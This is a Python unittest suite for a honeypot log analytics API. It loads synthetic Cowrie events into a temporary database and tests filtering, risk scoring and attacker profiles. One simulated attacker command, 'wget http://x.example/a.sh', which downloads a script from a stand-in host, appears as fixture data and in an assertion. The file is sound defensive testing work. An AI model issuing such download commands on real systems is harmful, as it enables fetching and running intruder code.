"""API tests against a small temporary database (no real data needed).

Run: python -m unittest discover -s tests
"""

import json
import tempfile
import unittest
from pathlib import Path

import pandas as pd
from fastapi.testclient import TestClient

from api.main import create_app
from src import analysis, database
from src.parser import parse_log_file
from src.sessionizer import build_sessions


BOT = "Brute-force Bot"
HUMAN = "Interactive / Human-like"
SCANNER = "Scanner / Recon"


def ev(eventid, ts, ip, sid, **extra):
    base = {
        "eventid": eventid,
        "timestamp": ts,
        "src_ip": ip,
        "session": sid,
    }

    base.update(extra)

    return json.dumps(base)


D1 = "2026-01-01T10:00:"
D2 = "2026-01-02T10:00:"


LINES = [
    # s1: 1.1.1.1 got in and ran a download command (Jan 1)
    ev(
        "cowrie.session.connect",
        D1 + "00.000Z",
        "1.1.1.1",
        "s1",
    ),
    ev(
        "cowrie.login.failed",
        D1 + "01.000Z",
        "1.1.1.1",
        "s1",
        username="root",
        password="123",
    ),
    ev(
        "cowrie.login.failed",
        D1 + "02.000Z",
        "1.1.1.1",
        "s1",
        username="admin",
        password="admin",
    ),
    ev(
        "cowrie.login.success",
        D1 + "03.000Z",
        "1.1.1.1",
        "s1",
        username="root",
        password="toor",
    ),
    ev(
        "cowrie.command.input",
        D1 + "05.000Z",
        "1.1.1.1",
        "s1",
        input="wget http://x.example/a.sh",
    ),
    ev(
        "cowrie.session.closed",
        D1 + "05.000Z",
        "1.1.1.1",
        "s1",
        duration=5.0,
    ),

    # s2: 2.2.2.2 brute-force (Jan 1)
    ev(
        "cowrie.session.connect",
        D1 + "10.000Z",
        "2.2.2.2",
        "s2",
    ),
    ev(
        "cowrie.login.failed",
        D1 + "11.000Z",
        "2.2.2.2",
        "s2",
        username="root",
        password="x",
    ),
    ev(
        "cowrie.login.failed",
        D1 + "12.000Z",
        "2.2.2.2",
        "s2",
        username="root",
        password="y",
    ),
    ev(
        "cowrie.login.failed",
        D1 + "13.000Z",
        "2.2.2.2",
        "s2",
        username="test",
        password="z",
    ),
    ev(
        "cowrie.session.closed",
        D1 + "13.000Z",
        "2.2.2.2",
        "s2",
        duration=3.0,
    ),

    # s3: 2.2.2.2 again (Jan 2)
    ev(
        "cowrie.session.connect",
        D2 + "00.000Z",
        "2.2.2.2",
        "s3",
    ),
    ev(
        "cowrie.login.failed",
        D2 + "01.000Z",
        "2.2.2.2",
        "s3",
        username="root",
        password="q",
    ),
    ev(
        "cowrie.session.closed",
        D2 + "01.000Z",
        "2.2.2.2",
        "s3",
        duration=1.0,
    ),

    # s4: 3.3.3.3 scanner (Jan 1)
    ev(
        "cowrie.session.connect",
        D1 + "20.000Z",
        "3.3.3.3",
        "s4",
    ),
    ev(
        "cowrie.session.closed",
        D1 + "21.000Z",
        "3.3.3.3",
        "s4",
        duration=1.0,
    ),
]


class TestAPI(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()

        base = Path(self.tmp.name)
        self.db = base / "test.db"
        log = base / "log.json"

        log.write_text(
            "\n".join(LINES),
            encoding="utf-8",
        )

        events, _ = parse_log_file(log)
        sessions = build_sessions(events)

        database.init_db(
            reset=True,
            db_path=self.db,
        )

        database.load_events(
            events,
            db_path=self.db,
        )

        database.load_sessions(
            sessions,
            db_path=self.db,
        )

        intel = pd.DataFrame(
            [
                {
                    "src_ip": "1.1.1.1",
                    "country": "Germany",
                    "country_code": "DE",
                    "city": "Berlin",
                    "latitude": 52.5,
                    "longitude": 13.4,
                },
                {
                    "src_ip": "2.2.2.2",
                    "country": "Unknown",
                    "country_code": None,
                    "city": None,
                    "latitude": None,
                    "longitude": None,
                },
                {
                    "src_ip": "3.3.3.3",
                    "country": "Unknown",
                    "country_code": None,
                    "city": None,
                    "latitude": None,
                    "longitude": None,
                },
            ]
        )

        database.load_ip_intel(
            intel,
            db_path=self.db,
        )

        clusters = pd.DataFrame(
            {
                "session": ["s1", "s2", "s3", "s4"],
                "src_ip": [
                    "1.1.1.1",
                    "2.2.2.2",
                    "2.2.2.2",
                    "3.3.3.3",
                ],
                "cluster_id": [0, 1, 1, 2],
                "behavior": [
                    HUMAN,
                    BOT,
                    BOT,
                    SCANNER,
                ],
            }
        )

        analysis.save_table(
            "session_clusters",
            clusters,
            db_path=self.db,
        )

        self.client = TestClient(
            create_app(db_path=self.db)
        )

    def tearDown(self):
        self.tmp.cleanup()

    def test_health(self):
        r = self.client.get("/health")

        self.assertEqual(r.status_code, 200)
        self.assertTrue(r.json()["database_ready"])

    def test_overview(self):
        data = self.client.get("/api/overview").json()

        self.assertEqual(data["sessions"], 4)
        self.assertEqual(data["unique_ips"], 3)
        self.assertEqual(data["failed_logins"], 6)
        self.assertEqual(data["successful_sessions"], 1)
        self.assertEqual(data["total_events"], 16)

    def test_behavior_filter(self):
        r = self.client.get(
            "/api/overview",
            params={"behavior": [BOT]},
        )

        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.json()["sessions"], 2)

    def test_multiple_behavior_filter(self):
        r = self.client.get(
            "/api/overview",
            params=[
                ("behavior", BOT),
                ("behavior", HUMAN),
            ],
        )

        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.json()["sessions"], 3)

    def test_nonexistent_behavior_returns_no_sessions(self):
        r = self.client.get(
            "/api/overview",
            params={"behavior": ["Not A Real Behavior"]},
        )

        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.json()["sessions"], 0)
        self.assertEqual(r.json()["unique_ips"], 0)

    def test_date_filter(self):
        r = self.client.get(
            "/api/overview",
            params={
                "start": "2026-01-02",
                "end": "2026-01-02",
            },
        )

        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.json()["sessions"], 1)
        self.assertEqual(r.json()["unique_ips"], 1)
        self.assertEqual(r.json()["failed_logins"], 1)
        self.assertEqual(r.json()["total_events"], 3)

    def test_start_date_only_filter(self):
        r = self.client.get(
            "/api/overview",
            params={"start": "2026-01-02"},
        )

        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.json()["sessions"], 1)

    def test_end_date_only_filter(self):
        r = self.client.get(
            "/api/overview",
            params={"end": "2026-01-01"},
        )

        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.json()["sessions"], 3)

    def test_combined_date_and_behavior_filter(self):
        r = self.client.get(
            "/api/overview",
            params={
                "start": "2026-01-01",
                "end": "2026-01-01",
                "behavior": BOT,
            },
        )

        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.json()["sessions"], 1)
        self.assertEqual(r.json()["unique_ips"], 1)
        self.assertEqual(r.json()["failed_logins"], 3)
        self.assertEqual(r.json()["total_events"], 5)

    def test_bad_date_range_rejected(self):
        r = self.client.get(
            "/api/overview",
            params={
                "start": "2026-02-01",
                "end": "2026-01-01",
            },
        )

        self.assertEqual(r.status_code, 422)

    def test_invalid_date_format_rejected(self):
        r = self.client.get(
            "/api/overview",
            params={"start": "not-a-date"},
        )

        self.assertEqual(r.status_code, 422)

    def test_timeline_respects_date_filter(self):
        timeline = self.client.get(
            "/api/timeline",
            params={
                "start": "2026-01-02",
                "end": "2026-01-02",
            },
        ).json()

        self.assertEqual(
            sum(row["sessions"] for row in timeline),
            1,
        )

        self.assertEqual(
            timeline[0]["day"],
            "2026-01-02",
        )

    def test_timeline_respects_behavior_filter(self):
        timeline = self.client.get(
            "/api/timeline",
            params={"behavior": BOT},
        ).json()

        self.assertEqual(
            sum(row["sessions"] for row in timeline),
            2,
        )

        self.assertTrue(
            all(row["behavior"] == BOT for row in timeline)
        )

    def test_hourly_respects_filters(self):
        hourly = self.client.get(
            "/api/hourly",
            params={"behavior": BOT},
        ).json()

        self.assertEqual(len(hourly), 24)

        self.assertEqual(
            sum(row["sessions"] for row in hourly),
            2,
        )

    def test_behaviors_respects_filters(self):
        rows = self.client.get(
            "/api/behaviors",
            params={"behavior": BOT},
        ).json()

        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["behavior"], BOT)
        self.assertEqual(rows[0]["sessions"], 2)
        self.assertAlmostEqual(rows[0]["share_pct"], 100.0)

    def test_countries_respects_filters(self):
        rows = self.client.get(
            "/api/countries",
            params={
                "start": "2026-01-02",
                "end": "2026-01-02",
            },
        ).json()

        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["country"], "Unknown")
        self.assertEqual(rows[0]["sessions"], 1)

    def test_map_respects_filters(self):
        all_points = self.client.get("/api/map").json()

        self.assertEqual(len(all_points), 1)
        self.assertEqual(all_points[0]["src_ip"], "1.1.1.1")

        filtered_points = self.client.get(
            "/api/map",
            params={
                "start": "2026-01-02",
                "end": "2026-01-02",
            },
        ).json()

        # The Jan 2 attacker has no GeoIP coordinates.
        self.assertEqual(filtered_points, [])

    def test_attackers_respects_filters(self):
        rows = self.client.get(
            "/api/attackers",
            params={
                "start": "2026-01-02",
                "end": "2026-01-02",
            },
        ).json()

        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["src_ip"], "2.2.2.2")
        self.assertEqual(rows[0]["sessions"], 1)
        self.assertEqual(rows[0]["failed_logins"], 1)

    def test_risk_levels_respects_filters(self):
        rows = self.client.get(
            "/api/risk-levels",
            params={
                "start": "2026-01-02",
                "end": "2026-01-02",
            },
        ).json()

        counts = {
            row["risk_level"]: row["ips"]
            for row in rows
        }

        self.assertEqual(counts["High"], 0)
        self.assertEqual(counts["Medium"], 0)
        self.assertEqual(counts["Low"], 1)

    def test_credentials(self):
        users = self.client.get(
            "/api/credentials",
            params={"kind": "username"},
        ).json()

        self.assertEqual(
            users[0],
            {"value": "root", "count": 5},
        )

        cmds = self.client.get(
            "/api/credentials",
            params={"kind": "command"},
        ).json()

        self.assertEqual(
            cmds[0]["value"],
            "wget http://x.example/a.sh",
        )

    def test_credentials_respect_date_filter(self):
        users = self.client.get(
            "/api/credentials",
            params={
                "kind": "username",
                "start": "2026-01-02",
                "end": "2026-01-02",
            },
        ).json()

        self.assertEqual(
            users,
            [{"value": "root", "count": 1}],
        )

    def test_credentials_respect_behavior_filter(self):
        users = self.client.get(
            "/api/credentials",
            params={
                "kind": "username",
                "behavior": BOT,
            },
        ).json()

        self.assertEqual(
            users[0],
            {"value": "root", "count": 3},
        )

    def test_invalid_credential_kind_rejected(self):
        r = self.client.get(
            "/api/credentials",
            params={"kind": "hash"},
        )

        self.assertEqual(r.status_code, 422)

    def test_map_only_has_ips_with_coordinates(self):
        points = self.client.get("/api/map").json()

        self.assertEqual(len(points), 1)
        self.assertEqual(points[0]["src_ip"], "1.1.1.1")
        self.assertEqual(points[0]["latitude"], 52.5)

    def test_attackers_ranked_by_risk(self):
        rows = self.client.get("/api/attackers").json()

        self.assertEqual(
            rows[0]["src_ip"],
            "1.1.1.1",
        )

        self.assertAlmostEqual(
            rows[0]["risk_score"],
            51.2,
        )

        self.assertEqual(
            rows[0]["risk_level"],
            "Medium",
        )

        self.assertEqual(
            rows[0]["country"],
            "Germany",
        )

    def test_map_risk_matches_attacker_risk(self):
        attackers = self.client.get(
            "/api/attackers",
            params={"limit": 25},
        ).json()

        points = self.client.get("/api/map").json()

        attacker = next(
            row
            for row in attackers
            if row["src_ip"] == "1.1.1.1"
        )

        point = next(
            row
            for row in points
            if row["src_ip"] == "1.1.1.1"
        )

        self.assertAlmostEqual(
            point["risk_score"],
            attacker["risk_score"],
        )

        self.assertEqual(
            point["risk_level"],
            attacker["risk_level"],
        )

    def test_risk_level_counts_match_attackers(self):
        attackers = self.client.get(
            "/api/attackers",
            params={"limit": 25},
        ).json()

        risk_rows = self.client.get(
            "/api/risk-levels"
        ).json()

        attacker_counts = {
            "High": 0,
            "Medium": 0,
            "Low": 0,
        }

        for row in attackers:
            attacker_counts[row["risk_level"]] += 1

        api_counts = {
            row["risk_level"]: row["ips"]
            for row in risk_rows
        }

        self.assertEqual(
            api_counts,
            attacker_counts,
        )

    def test_overview_high_risk_ips_matches_risk_levels(self):
        overview = self.client.get(
            "/api/overview"
        ).json()

        risk_rows = self.client.get(
            "/api/risk-levels"
        ).json()

        high_count = next(
            row["ips"]
            for row in risk_rows
            if row["risk_level"] == "High"
        )

        self.assertEqual(
            overview["high_risk_ips"],
            high_count,
        )

    def test_attacker_profile_matches_attacker_summary(self):
        summary_rows = self.client.get(
            "/api/attackers",
            params={"limit": 25},
        ).json()

        summary = next(
            row
            for row in summary_rows
            if row["src_ip"] == "1.1.1.1"
        )

        profile = self.client.get(
            "/api/attackers/1.1.1.1"
        )

        self.assertEqual(profile.status_code, 200)

        profile = profile.json()

        for field in (
            "sessions",
            "failed_logins",
            "successful_sessions",
            "commands",
            "download_sessions",
            "risk_level",
        ):
            self.assertEqual(
                profile[field],
                summary[field],
            )

        self.assertAlmostEqual(
            profile["risk_score"],
            summary["risk_score"],
        )

    def test_filtered_map_and_attackers_keep_same_risk(self):
        params = {
            "start": "2026-01-01",
            "end": "2026-01-01",
            "behavior": HUMAN,
        }

        attackers = self.client.get(
            "/api/attackers",
            params={**params, "limit": 25},
        ).json()

        points = self.client.get(
            "/api/map",
            params=params,
        ).json()

        self.assertEqual(len(attackers), 1)
        self.assertEqual(len(points), 1)

        self.assertEqual(
            points[0]["src_ip"],
            attackers[0]["src_ip"],
        )

        self.assertAlmostEqual(
            points[0]["risk_score"],
            attackers[0]["risk_score"],
        )

        self.assertEqual(
            points[0]["risk_level"],
            attackers[0]["risk_level"],
        )

    def test_attacker_profile_respects_date_filter(self):
        profile = self.client.get(
            "/api/attackers/2.2.2.2",
            params={
                "start": "2026-01-02",
                "end": "2026-01-02",
            },
        )

        self.assertEqual(profile.status_code, 200)

        data = profile.json()

        self.assertEqual(data["sessions"], 1)
        self.assertEqual(data["failed_logins"], 1)
        self.assertEqual(data["successful_sessions"], 0)
        self.assertEqual(data["commands"], 0)

    def test_attacker_profile_respects_behavior_filter(self):
        profile = self.client.get(
            "/api/attackers/2.2.2.2",
            params={"behavior": BOT},
        )

        self.assertEqual(profile.status_code, 200)

        data = profile.json()

        self.assertEqual(data["sessions"], 2)
        self.assertEqual(data["failed_logins"], 4)
        self.assertEqual(data["successful_sessions"], 0)

    def test_attacker_profile_returns_404_when_ip_is_removed_by_filter(self):
        profile = self.client.get(
            "/api/attackers/1.1.1.1",
            params={
                "start": "2026-01-02",
                "end": "2026-01-02",
            },
        )

        self.assertEqual(profile.status_code, 404)

    def test_attacker_profile_credentials_follow_filters(self):
        profile = self.client.get(
            "/api/attackers/2.2.2.2",
            params={
                "start": "2026-01-01",
                "end": "2026-01-01",
                "behavior": BOT,
            },
        )

        self.assertEqual(profile.status_code, 200)

        data = profile.json()

        self.assertEqual(
            data["usernames"],
            [
                {"value": "root", "count": 2},
                {"value": "test", "count": 1},
            ],
        )

        self.assertEqual(
            data["passwords"],
            [
                {"value": "x", "count": 1},
                {"value": "y", "count": 1},
                {"value": "z", "count": 1},
            ],
        )

        self.assertEqual(
            data["commands_top"],
            [],
        )

    def test_attacker_dna(self):
        response = self.client.get(
            "/api/attackers/1.1.1.1/dna"
        )

        self.assertEqual(response.status_code, 200)

        data = response.json()

        self.assertEqual(data["src_ip"], "1.1.1.1")
        self.assertEqual(data["sessions"], 1)
        self.assertEqual(data["failed_logins"], 2)
        self.assertEqual(data["successful_sessions"], 1)
        self.assertEqual(data["commands"], 1)
        self.assertEqual(data["download_sessions"], 1)

        self.assertEqual(data["login_rate"], 100.0)
        self.assertEqual(data["command_rate"], 100.0)
        self.assertEqual(data["download_rate"], 100.0)

        self.assertEqual(data["persistence"], 50.0)
        self.assertEqual(data["activity"], 75.0)

        self.assertIn("BF", data["fingerprint"])
        self.assertIn("AUTH", data["fingerprint"])
        self.assertIn("CMD", data["fingerprint"])
        self.assertIn("DL", data["fingerprint"])
        self.assertIn("PERSIST", data["fingerprint"])

    def test_attacker_dna_respects_date_filter(self):
        response = self.client.get(
            "/api/attackers/2.2.2.2/dna",
            params={
                "start": "2026-01-02",
                "end": "2026-01-02",
            },
        )

        self.assertEqual(response.status_code, 200)

        data = response.json()

        self.assertEqual(data["src_ip"], "2.2.2.2")
        self.assertEqual(data["sessions"], 1)
        self.assertEqual(data["failed_logins"], 1)

    def test_attacker_dna_respects_behavior_filter(self):
        response = self.client.get(
            "/api/attackers/2.2.2.2/dna",
            params={"behavior": BOT},
        )

        self.assertEqual(response.status_code, 200)

        data = response.json()

        self.assertEqual(data["src_ip"], "2.2.2.2")
        self.assertEqual(data["sessions"], 2)
        self.assertEqual(data["failed_logins"], 4)

    def test_attacker_dna_returns_404_for_filtered_out_ip(self):
        response = self.client.get(
            "/api/attackers/2.2.2.2/dna",
            params={
                "start": "2026-01-01",
                "end": "2026-01-01",
                "behavior": HUMAN,
            },
        )

        self.assertEqual(response.status_code, 404)

    def test_missing_database_returns_503(self):
        client = TestClient(
            create_app(
                db_path=Path(self.tmp.name) / "nope.db"
            )
        )

        self.assertEqual(
            client.get("/api/overview").status_code,
            503,
        )

        self.assertFalse(
            client.get("/health").json()["database_ready"]
        )


if __name__ == "__main__":
    unittest.main()